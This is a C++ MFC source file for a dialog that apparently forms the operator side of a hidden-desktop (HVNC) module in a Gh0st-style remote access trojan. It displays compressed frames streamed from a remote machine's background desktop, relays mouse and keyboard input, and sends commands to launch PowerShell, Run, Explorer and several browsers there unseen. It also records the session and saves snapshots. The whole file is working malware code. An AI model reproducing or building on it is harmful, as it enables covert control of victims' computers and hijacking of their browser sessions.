// CDesktopDlg.cpp: 实现文件
//

#include "pch.h"
#include<imm.h>
#include "nbclass.h"
#include "CDesktopDlg.h"
#include "afxdialogex.h"
#include"../../common/macros.h"
#pragma comment(lib, "Imm32.lib")

static const COLORREF gc_trans = RGB(255, 174, 201);

// CDesktopDlg 对话框
enum
{
	IDM_CONTROL = 0x0010,	// 控制屏幕
	IDM_SAVEAVI,
	IDM_FULLSCREEN,
	IDM_TOPMOST,			// 屏幕窗口置顶
	IDM_CTRL_ALT_DEL,		// 发送Ctrl+Alt+Del
	IDM_TRACE_CURSOR,		// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,		// 锁定远程计算机输入
	IDM_BLANK_SCREEN,		// 黑屏
	IDM_CAPTURE_LAYER,		// 捕捉层
	IDM_SAVEDIB,			// 保存图片
	IDM_GET_CLIPBOARD,		// 获取剪贴板
	IDM_SET_CLIPBOARD,		// 设置剪贴板
	IDM_AERO_DISABLE,		// 禁用桌面合成(Aero)
	IDM_AERO_ENABLE,		// 启用桌面合成(Aero)
	IDM_QUALITY75,		// 清晰度中
	IDM_QUALITY30,		// 清晰度低
	IDM_QUALITY100,		// 清晰度高
	IDM_ALGORITHM_HOME,		// 家用办公算法
	IDM_ALGORITHM_XVID,		// 影视娱乐算法
	IDM_DEEP_16,
	IDM_DEEP_32,
	IDM_EXPLORER,					//打开桌面
	IDM_RUN,							//打开运行
	IDM_POWERSHELL,
	IDM_CMROME,
	IDM_EDGE,
	IDM_FIREFOX,
	IDM_IE,
};



#ifndef SPI_GETWINARRANGING
#define SPI_GETWINARRANGING 0x0082
#endif
#ifndef SPI_SETWINARRANGING
#define SPI_SETWINARRANGING 0x0083
#endif
#ifndef SPI_GETSNAPSIZING
#define SPI_GETSNAPSIZING   0x008E
#endif
#ifndef SPI_SETSNAPSIZING
#define SPI_SETSNAPSIZING   0x008F
#endif

IMPLEMENT_DYNAMIC(CDesktopDlg, CDialog)

CDesktopDlg::CDesktopDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(IDD_SCREENSPY, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	char szIconFileName[MAX_PATH];
	GetSystemDirectoryA(szIconFileName, MAX_PATH);
	lstrcat(szIconFileName, _T("\\shell32.dll"));
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szIconFileName, 17/*网上邻居图标索引*/);

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	pRtlDecompressBuffer = (TRtlDecompressBuffer)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "RtlDecompressBuffer");

	bmpInfo.bmiHeader.biSize = sizeof(bmpInfo.bmiHeader);
	bmpInfo.bmiHeader.biPlanes = 1;
	bmpInfo.bmiHeader.biBitCount = 24;
	bmpInfo.bmiHeader.biCompression = BI_RGB;
	bmpInfo.bmiHeader.biClrUsed = 0;

}

CDesktopDlg::~CDesktopDlg()
{

}

void CDesktopDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CDesktopDlg, CDialog)
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
END_MESSAGE_MAP()


// CDesktopDlg 消息处理程序


void CDesktopDlg::OnSize(UINT nType, int cx, int cy)
{
	if (!GetSafeHwnd())
		return;

	SendNext();
}

void CDesktopDlg::OnClose()
{
	__try
	{
		m_pContext->m_Dialog[1] = 0;
		closesocket(m_pContext->m_Socket);
		LocalFree(pixels);
		DestroyWindow();
	}
	__except (EXCEPTION_EXECUTE_HANDLER/*AnalysisException(GetExceptionInformation())*/)
	{
		return;
	}
}

void CDesktopDlg::OnReceiveComplete()
{

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
		case TOKEN_NEXTSCREEN:
				DrawNextScreenHome();
			break;
		default:
			return;
	}
}

void CDesktopDlg::OnReceive()
{
	return;
}

BOOL CDesktopDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	// when the application's main window is not a dialog
	// Set the icon for this dialog.  The framework does this automatically
	// when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu* pSysMenu = GetSystemMenu(FALSE);

	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "控制屏幕");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, "录制屏幕");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_EXPLORER, "打开桌面");
		pSysMenu->AppendMenu(MF_STRING, IDM_RUN, "打开运行");
		pSysMenu->AppendMenu(MF_STRING, IDM_POWERSHELL, "打开-powershell");
		pSysMenu->AppendMenu(MF_STRING, IDM_CMROME, "打开-谷歌浏览器");
		pSysMenu->AppendMenu(MF_STRING, IDM_EDGE, "打开-Edge");
		pSysMenu->AppendMenu(MF_STRING, IDM_FIREFOX, "打开-火狐浏览器");
		pSysMenu->AppendMenu(MF_STRING, IDM_IE, "打开-IE浏览器");
	}

	// TODO: Add extra initialization here
	CString str;
	str.Format(_T("IP : %s 后台屏幕"), m_IPAddress);
	SetWindowText(str);


	ImmAssociateContext(m_hWnd, NULL);

	SendNext();
	return TRUE;  // return TRUE unless you set the focus to a control
}

void CDesktopDlg::DrawNextScreenHome()
{
	PBYTE buff = m_pContext->m_DeCompressionBuffer.GetBuffer(1);

	screenWidth = ((PDWORD)buff)[0];
	screenHeight = ((PDWORD)buff)[1];
	With = ((PDWORD)buff)[2];
	Height = ((PDWORD)buff)[3];
	DWORD size = ((PDWORD)buff)[4];
	buff += 20;

	
	DWORD newPixelsSize = With * 3 * Height;
	BYTE* newPixels = (BYTE*)LocalAlloc(LPTR,newPixelsSize);
	pRtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, newPixels, newPixelsSize, buff, size, &size);

	if (pixels && pixelsWidth == With && pixelsHeight == Height)
	{
		for (DWORD i = 0; i < newPixelsSize; i += 3)
		{
			if (newPixels[i] == GetRValue(gc_trans) &&
				newPixels[i + 1] == GetGValue(gc_trans) &&
				newPixels[i + 2] == GetBValue(gc_trans))
			{
				continue;
			}
			pixels[i] = newPixels[i];
			pixels[i + 1] = newPixels[i + 1];
			pixels[i + 2] = newPixels[i + 2];
		}
		LocalFree(newPixels);
	}
	else
	{
		LocalFree(pixels);
		pixels = newPixels;
	}

	HDC hDc = ::GetDC(m_hWnd);
	HDC hDcBmp = CreateCompatibleDC(hDc);
	HBITMAP hBmp;

	hBmp = CreateCompatibleBitmap(hDc, With, Height);
	SelectObject(hDcBmp, hBmp);

	bmpInfo.bmiHeader.biSizeImage = newPixelsSize;
	bmpInfo.bmiHeader.biWidth = With;
	bmpInfo.bmiHeader.biHeight = Height;
	SetDIBits(hDcBmp,
		hBmp,
		0,
		Height,
		pixels,
		&bmpInfo,
		DIB_RGB_COLORS);

	DeleteDC(g_hDcBmp);
	pixelsWidth = With;
	pixelsHeight = Height;
	g_hDcBmp = hDcBmp;
	InvalidateRgn(NULL, TRUE);
	DeleteObject(hBmp);
	::ReleaseDC(NULL, hDc);
}


void CDesktopDlg::OnPaint()
{
	if (m_bIsFirst)
	{
		return;
	}

	PAINTSTRUCT ps;
	HDC         hDc = ::BeginPaint(this->m_hWnd,&ps);

	RECT clientRect;
	::GetClientRect(this->m_hWnd, &clientRect);

	RECT rect;
	HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));
	rect.left = 0;
	rect.top = 0;
	rect.right = clientRect.right;
	rect.bottom = clientRect.bottom;

	rect.left = With;
	FillRect(hDc, &rect, hBrush);
	rect.left = 0;
	rect.top = Height;
	FillRect(hDc, &rect, hBrush);
	DeleteObject(hBrush);

	BitBlt(hDc, 0, 0, With, Height, g_hDcBmp, 0, 0, SRCCOPY);

	::EndPaint(this->m_hWnd, &ps);

	// 写入录像文件
	if (!m_aviFile.IsEmpty())
	{
		m_aviStream.Write(pixels);
	}
}

void CDesktopDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case SC_MAXIMIZE:
		OnNcLButtonDblClk(HTCAPTION, NULL);
		return;
	case SC_MONITORPOWER: // 拦截显示器节电自动关闭的消息
		return;
	case SC_SCREENSAVE:   // 拦截屏幕保护启动的消息
		return;
	case IDM_CONTROL:
	{
		m_bIsCtrl = !m_bIsCtrl;
		pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);
		if (m_bIsCtrl)
		{
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_ARROW));
		}
		else
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));		
	}
	break;
	case IDM_TOPMOST:
	{
		bool bIsTopMost = pSysMenu->GetMenuState(IDM_TOPMOST, MF_BYCOMMAND) & MF_CHECKED;
		pSysMenu->CheckMenuItem(IDM_TOPMOST, bIsTopMost ? MF_UNCHECKED : MF_CHECKED);
		if (bIsTopMost)
			SetWindowPos(&wndNoTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		else
			SetWindowPos(&wndTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
	}
	break;
	case IDM_CAPTURE_LAYER:  // 捕捉层
	{
		bool bIsChecked = pSysMenu->GetMenuState(IDM_CAPTURE_LAYER, MF_BYCOMMAND) & MF_CHECKED;
		pSysMenu->CheckMenuItem(IDM_CAPTURE_LAYER, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_CAPTURE_LAYER;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	break;
	case IDM_SAVEAVI:
		SaveAvi();
		break;
	case IDM_EXPLORER:
		MyOpen(COMMAND_DESKTOP_EXPLORER);
		break;
	case IDM_RUN:
		MyOpen(COMMAND_DESKTOP_RUN);
		break;
	case IDM_POWERSHELL:
		MyOpen(COMMAND_DESKTOP_POWERSHELL);
		break;
	case IDM_CMROME:
		MyOpen(COMMAND_DESKTOP_CMROME);
		break;
	case IDM_EDGE:
		MyOpen(COMMAND_DESKTOP_EDGE);
		break;
	case IDM_FIREFOX:
		MyOpen(COMMAND_DESKTOP_FIREFOX);
		break;
	case IDM_IE:
		MyOpen(COMMAND_DESKTOP_IE);
		break;
	default:
		CDialog::OnSysCommand(nID, lParam);
	}
}

bool CDesktopDlg::SaveSnapshot()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"), this);
	if (dlg.DoModal() != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
	BITMAPINFO		lpbi;
	memcpy(&lpbi, &bmpInfo,sizeof(BITMAPINFO));

	CFile	file;
	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("文件保存失败");
		return false;
	}

	// BITMAPINFO大小
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi.bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi.bmiHeader.biBitCount)) * sizeof(RGBQUAD);

	// Fill in the fields of the file header
	hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize = lpbi.bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
	hdr.bfOffBits = sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(&lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(pixels, lpbi.bmiHeader.biSizeImage);
	file.Close();

	return true;
}

void CDesktopDlg::SaveAvi()
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_UNCHECKED);
		m_aviFile = "";
		m_aviStream.Close();
		return;
	}

	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.avi");
	CFileDialog dlg(FALSE, "avi", strFileName, OFN_OVERWRITEPROMPT, "视频文件(*.avi)|*.avi|", this);
	if (dlg.DoModal() != IDOK)
		return;
	m_aviFile = dlg.GetPathName();
	if (!m_aviStream.Open(m_aviFile, &bmpInfo))
	{
		m_aviFile = "";
		MessageBox("创建录像文件失败");
	}
	else
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_CHECKED);
	}
}

void CDesktopDlg::MyOpen(BYTE falg)
{
	BYTE bToken = falg;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

BOOL CDesktopDlg::PreTranslateMessage(MSG* pMsg)
{

	switch (pMsg->message)
	{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDBLCLK:
		case WM_MOUSEMOVE:
		case WM_MOUSEWHEEL:
		{
			if (pMsg->message == WM_MOUSEMOVE && GetKeyState(VK_LBUTTON) >= 0)
				break;
			int x = GET_X_LPARAM(pMsg->lParam);
			int y = GET_Y_LPARAM(pMsg->lParam);
			float ratioX = (float)screenWidth / pixelsWidth;
			float ratioY = (float)screenHeight / pixelsHeight;
			x = (int)(x * ratioX);
			y = (int)(y * ratioY);
			pMsg->lParam = MAKELPARAM(x, y);
			SendCommand(pMsg);
			return TRUE;
			break;
		}
	case WM_CHAR:
	{
		if (iscntrl(pMsg->wParam))
			break;
		SendCommand(pMsg);
		return TRUE;
		break;
	}
	case WM_KEYDOWN:
	case WM_KEYUP:
	{
		switch (pMsg->wParam)
		{
		case VK_UP:
		case VK_DOWN:
		case VK_RIGHT:
		case VK_LEFT:
		case VK_HOME:
		case VK_END:
		case VK_PRIOR:
		case VK_NEXT:
		case VK_INSERT:
		case VK_RETURN:
		case VK_DELETE:
		case VK_BACK:
			break;
		default:
			return 0;
		}
		SendCommand(pMsg);
		return TRUE;
		break;
	}
	default:
		break;
	}
	
	return CDialog::PreTranslateMessage(pMsg);
}

void CDesktopDlg::SendCommand(MSG* pMsg)
{
	if (!m_bIsCtrl)
		return;
	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	lpData[0] = COMMAND_SCREEN_CONTROL;
	memcpy(lpData + 1, pMsg, sizeof(MSG));
	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);

	delete[] lpData;
}


void CDesktopDlg::SendNext()
{
	LPBYTE buff = (LPBYTE)LocalAlloc(LPTR,10);
	buff[0] = COMMAND_NEXT;

	RECT rect;
	GetClientRect(&rect);

	int realRight = (rect.right > screenWidth && screenWidth > 0) ? screenWidth : rect.right;
	int realBottom = (rect.bottom > screenHeight && screenHeight > 0) ? screenHeight : rect.bottom;

	if ((realRight * 3) % 4)
		realRight += ((realRight * 3) % 4);

	memcpy(buff+1, &realRight,4);
	memcpy(buff + 5,&realBottom,4);
	m_iocpServer->Send(m_pContext, buff, 9);
	m_bIsFirst = 0;
	LocalFree(buff);
}

LRESULT CDesktopDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
	// TODO: Add your specialized code here and/or call the base class
	if (message == WM_POWERBROADCAST && wParam == PBT_APMQUERYSUSPEND)
	{
		return BROADCAST_QUERY_DENY; // 拦截系统待机, 休眠的请求
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) != WA_INACTIVE && !HIWORD(wParam) /*&& m_bIsFullScreen*/)
	{
		SetWindowPos(&wndTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		return TRUE;
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) == WA_INACTIVE  /*&& m_bIsFullScreen*/)
	{
		SetWindowPos(&wndNoTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		return TRUE;
	}
	if (message == WM_LBUTTONDBLCLK)
	{
		return TRUE;
	}
	return CDialog::WindowProc(message, wParam, lParam);
}

